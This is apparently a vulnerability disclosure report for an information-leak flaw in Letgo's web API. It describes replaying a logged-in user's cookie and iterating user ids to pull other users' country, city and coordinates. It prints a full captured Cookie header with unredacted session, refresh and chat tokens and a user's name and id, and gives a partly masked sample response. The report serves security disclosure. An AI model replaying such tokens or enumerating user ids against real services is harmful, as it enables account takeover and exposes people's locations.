# About Letgo Website Information Disclosure Security Vulnerability Description

## 1 Security vulnerability implementation steps 
### 1.1 Get Header request data
Intercept browser Cookie information after logging in by a valid user.
```
Cookie: bm_sz=8FB1E16AC462956C1010AE408ADF8877~YAAQTfferfSGKKGOAQAAHKZ+ohf081udjRXjGcjfZnbDk7H/2OxsL/R7NYg/G7UE1MCrQ2bnPtVZ806M6fYxdpVT9y/ZbJS0RN+mabHte0freZLVXsHSIyZg97Fdq6HnhkKFb0KCkyXTbe//dQZ4eEddTe3JEi6MitXWtfC5FEgEbm8i3p0oCxQnEzs1HvHPJ+FR+OnnYjS0NMVyg6o7qjuLJJljTOrB7HfUE3sl+xFDsEPkGUcbBqwaLEJf6x1ED9gjPIxHVQRz6oePTYJd4HCn5v1HRxqeYZ5mdymhQssZLzHvq73hyx67Na26ifiNzH0IbUCOkDNXldUqzrcCrNb9nGL/c3wKyqKgra0T2RhVzHA4uNgU5FVDJNZNsqpHVBIQv1V77o5NTHNG/w==~3619128~3290949; _abck=5F5D0B93832422F37ED1EDA73AB210B4~0~YAAQTfferTOJKKGOAQAAiK5+ogtRXJrIUvxPeoU8BODl/dqLEFzUAb9ZPERFYauL7HoBojf8M5jsP2lXVh5opGlbF0kiaOHGbkisD9z1QkGF//UrXAGuKkBr0OS33x3d+5PlYPXEvtUROxVCo7oFdtdqr3IzhO1wi8kvACI0F3g9vazv3Lyjpvh3RRN6kBf9SKpap73CpmF72ieDHJl+6n8OR6mXq/Qd6IsXpwROLPPZAYoI9pBUd/BFj4myBk+HFL4W2t2pSw3XcDQBTfL3KRrIsfdE8kFCEDfNThkvfhrajO+lqikR/+blXtH1dWI3cu8FGo7i2LrEra76/WLsshnu4+Ft6Vcq85HfZdq3Fs64wRNX6yM1vP0mQoDLXvSGMTKWsdvWn4Lkv4U19iGXYETBz0aIOsRr~-1~-1~-1; home_page_banner=1; relevanceUser=04610500735853733; locationPath=%5B%7B%22id%22%3A4000040%2C%22name%22%3A%22%C4%B0stanbul%22%2C%22type%22%3A%22CITY%22%2C%22longitude%22%3A28.97696%2C%22latitude%22%3A41.00527%2C%22parentId%22%3A1000001%7D%5D; __exponea_etc__=00a0a0b4-b6a5-489e-b752-51bc5929a138; __exponea_time2__=1.330536127090454; g_state={"i_l":0}; OptanonAlertBoxClosed=2024-04-03T05:46:58.824Z; OptanonConsent=isGpcEnabled=0&datestamp=Wed+Apr+03+2024+13%3A46%3A58+GMT%2B0800+(%E4%B8%AD%E5%9B%BD%E6%A0%87%E5%87%86%E6%97%B6%E9%97%B4)&version=202303.2.0&browserGpcFlag=0&isIABGlobal=false&hosts=&landingPath=NotLandingPage&groups=C0002%3A1%2CC0003%3A1%2CC0004%3A1%2CC0001%3A1; user=j%3A%7B%22id%22%3A%22506161522%22%2C%22name%22%3A%22shix%20Yang%22%7D; t=eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6ImViT21QTmlrIn0.eyJncmFudFR5cGUiOiJlbWFpbCIsImNsaWVudFR5cGUiOiJ3ZWIiLCJ0b2tlblR5cGUiOiJhY2Nlc3NUb2tlbiIsImlzTmV3VXNlciI6ZmFsc2UsImlhdCI6MTcxMjEyMzIzNSwiZXhwIjoxNzEyMTI0MTM1LCJhdWQiOiJvbHh0ciIsImlzcyI6Im9seCIsInN1YiI6IjUwNjE2MTUyMiIsImp0aSI6IjEzNDMyMjdkZjA4YzEwNjE1YjhkZDdmN2ZhOTU1M2M1YTBiODhjNDUifQ.blLRqvpaMIaZf7ZnpL0QrfAhFgCQe7Zo6A8UgPa0Nw8d28SwqM2dramysONbeDCayaGDGqevzrUL-CZRyE018hi6Z8uC43swiwl43NG8ORp2L8CQicOlCL7S1pNpJUcRRqKkgIFgtK3CPH55omHtvYGLZQPJRocf86bMRzmZ1rJmfiG7uodU4dX6BZKNzL-tfDd-byMx7hbledNJnfosqiroDjcmbckLgH4dJ-1IvmHj5dEUyTUnlL7QIVIzS9vyUzA-5whI_oed_lF0DDb3zFzmW9ai47OHVjL0rZsiA3j3BowGXIBi64JRK9MSKuINzsuiaGINrhFmTfAVXPEZkw; rt=eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6ImViT21QTmlrIn0.eyJncmFudFR5cGUiOiJlbWFpbCIsImNsaWVudFR5cGUiOiJ3ZWIiLCJ0b2tlblR5cGUiOiJyZWZyZXNoVG9rZW4iLCJyZWFjdGl2YXRlZCI6ZmFsc2UsImlhdCI6MTcxMjEyMzIzNSwiZXhwIjoxNzIwMTU4NDM1LCJhdWQiOiJvbHh0ciIsImlzcyI6Im9seCIsInN1YiI6IjUwNjE2MTUyMiIsImp0aSI6IjEzNDMyMjdkZjA4YzEwNjE1YjhkZDdmN2ZhOTU1M2M1YTBiODhjNDUifQ.FmgGwzHC4CVmn6EFM4Xq65VPtKXHuDJSg8pfaAjT0OKn_9SbwSdTuhEm2rA7GgbwQiCH6H9GjT-xP-mgDgZqoZVL45aAwWkKTzcrLpx7vLCAzcLuVccOqf0q_8gfPUH4y7m3NUxyXUYeixv9Zpwy3SPHATWERlCIEwvAtG1U6fSIQuxI9D6hDRc47LfyPEahWZlX1zKz8vO0chHMomjYCGtXVQ_BwlTxsKCEPK3ZVni2fHGeHuSE-EMXZSfk-GVVIKLMAF8jh4qrVE4efx22ED6613JIBmkFdmsdmswksQyOzTnr6_VF-4838YaFEftcO6BVChXSfhtmhMk9bjc2CA; lf=1; ct=eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCIsImtpZCI6ImViT21QTmlrIn0.eyJ0b2tlblR5cGUiOiJjaGF0VG9rZW4iLCJ2ZXJzaW9uIjoiMSIsImlhdCI6MTcxMjEyMzIzNSwiZXhwIjoxNzEyMjA5NjM1LCJhdWQiOiJvbHh0ciIsImlzcyI6Im9seCIsInN1YiI6IjUwNjE2MTUyMiIsImp0aSI6IjEzNDMyMjdkZjA4YzEwNjE1YjhkZDdmN2ZhOTU1M2M1YTBiODhjNDUifQ.e87_pjSMCoBFvy5YcDaRB-7AD9rPrt_eLTdq1SIyh8xqohgPxDpSd0CIs46l6z4pWkbAu7NfbyPtDfhmSyls2-N0_y8PNNCMMFVVHxmNuH5DCcSfMA9XNrTwtReElKjUP50shRGFvddUHcKzZ9M2W777kPHwH4MmAYnlvll9KU8FKh_0o1Mv5yDE9JUXGdqfPakFAK6k0j-mIAMht-tixOKV0yc-KmxBpAckofwU1rksgGATqrfAJC-CovN-xRDHjxyTe1G9UVP7w3PSWiOvr6ohlgWx4wP2picpIF1lnrXCuYSZ0sf8ICYWjGuKWgXMMAmC5VXhjsG9oAFIBXAHCQ; nt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE3MTIxMjMyMzUsImJyYW5kIjoibGV0Z28iLCJjb3VudHJ5Q29kZSI6InRyIiwidXNlcklkIjo1MDYxNjE1MjJ9.zQMPZKu_nUZk3Sbje1SkJfyvIjLqfyvlwgMInsn-Qz8; onap=18ea27f6376x507c2fcc-1-18ea27f6376x507c2fcc-22-1712125041; reply_restriction=false; kyc_reply_count=0; G_ENABLED_IDPS=google; G_AUTHUSER_H=0
```

### 1.2 Add cookie to the replay attack HTTP Request Header

## 2 Disclosure of user information by replay attack

> Leaked information includes: country,city,specific location,latitude and longgitude.

> Request method: GET, information can be obtained by traversing user id,such as "18d5faa06d0x3c1d96aa","18d5faa06d0x3c1da96a
"...

API URL\application unit and request parameters of verified project information leakage are shown in the following table:

| authenticated user | API URL | Request params |
|-------------------|---|-----------|
|shix Yang|https://www.letgo.com/api/relevance/v4/feed?latitude=41.00527&location=4000040&longitude=28.97696&page=1&user=18d5faa06d0x3c1d96aa|user=18d5faa06d0x3c1d96aa|



### Leaked packet cases 
``` 
{
  "id": "1679006051",
  "score": 0.95,
  "spell": {
    "id": 114,
    "key": "DETECT_POISON_ES",
    ...
  },
  "status": {
    "status": "active",
    ...
  },
  "category_id": "1201",
  ...
  "user_id": "167174742",
  "locations_resolved": {
    "COUNTRY_id": "1******",
    "COUNTRY_name": "Türkiye",
    "ADMIN_LEVEL_3_id": "4*****",
    "ADMIN_LEVEL_3_name": "İ***",
    "SUBLOCALITY_LEVEL_1_id": "5*****",
    "SUBLOCALITY_LEVEL_1_name": "B*******"
  },
  ...
	 "locations": [
              {
                  "lat": **.***,
                  "lon": **.***,
                  "district_id": "5000443",
                  "city_id": "4******"
              }
          ],
...
}
```